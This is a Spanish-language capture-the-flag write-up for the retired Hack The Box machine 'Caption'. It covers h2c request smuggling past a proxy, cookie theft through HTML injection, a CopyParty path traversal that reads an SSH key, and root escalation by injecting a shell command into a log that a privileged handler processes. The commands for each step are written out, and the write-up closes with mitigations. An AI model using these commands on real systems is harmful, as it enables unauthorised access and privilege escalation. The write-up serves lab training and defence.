---
machine: Caption
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, http2, request-smuggling, copyparty, privesc]
---

# Caption — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El proxy bloquea rutas administrativas, pero acepta h2c y permite smuggling para alcanzarlas. Una inyección HTML roba la cookie del administrador; CopyParty expone un traversal que lee una clave SSH. La escalada abusa de una inyección de comandos en el manejador de logs.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP y `443/tcp` HTTPS.
- Servicios: Proxy/caché delante de una aplicación web y una instancia de CopyParty.
- Tecnologías: HAProxy/Varnish, HTTP/2 cleartext (h2c), CopyParty y un manejador de logs.

## Enumeración

- `caption.htb` detrás de un proxy que devuelve 403 en `/admin`.
- `copy.caption.htb` con CopyParty.
- El servidor acepta HTTP/2 prior knowledge en claro.
- Cookie de sesión del administrador y rutas internas.

## Foothold

Se usa smuggling h2c para que el proxy reenvíe una petición a `/admin` que el frontend bloquea. La inyección HTML en una página visible para el administrador exfiltra su cookie; con ella se accede a CopyParty y a un traversal que lee `id_rsa`.

```bash
curl --http2-prior-knowledge -s http://caption.htb/admin
python3 h2cSmuggler.py -u http://caption.htb/admin
curl "http://copy.caption.htb/?path=../../../../home/<USER>/.ssh/id_rsa"
ssh -i id_rsa <USER>@caption.htb
```

## Movimiento lateral

La cookie del administrador da acceso a la interfaz interna; desde allí se localiza CopyParty y la clave del usuario del sistema.

## Escalada de privilegios

Un proceso privilegiado procesa logs en un directorio escribible. Se inyecta una línea con un comando y el manejador la ejecuta como root.

```bash
sudo -l
ls -l /var/log/<APP>/
printf 'x; /bin/bash -c "id" #\n' >> /var/log/<APP>/access.log
# Sustituir id por la acción deseada y esperar al manejador.
```

## Evidencia

- Respuesta 200 a `/admin` tras el smuggling.
- Cookie del administrador y acceso a CopyParty.
- Clave SSH leída y prompt de root.

## Lecciones aprendidas

- Bloquear rutas en el frontend no protege si el backend acepta otro protocolo.
- CopyParty debe limitar el traversal y no ejecutarse con acceso amplio.
- Los logs son datos no confiables para cualquier procesador privilegiado.

## Mitigación y detección

- Rechazar h2c en el proxy y normalizar el protocolo en todos los saltos.
- Restringir CopyParty y validar rutas canónicas.
- Parsear logs como datos y ejecutar el manejador sin shell.

## Referencias

- [0xdf — Caption](https://0xdf.gitlab.io/2025/01/25/htb-caption.html)
- [IppSec — Caption](https://www.youtube.com/watch?v=JY_xds4LsW0)
- [Hack The Box — Caption](https://app.hackthebox.com/machines/caption)
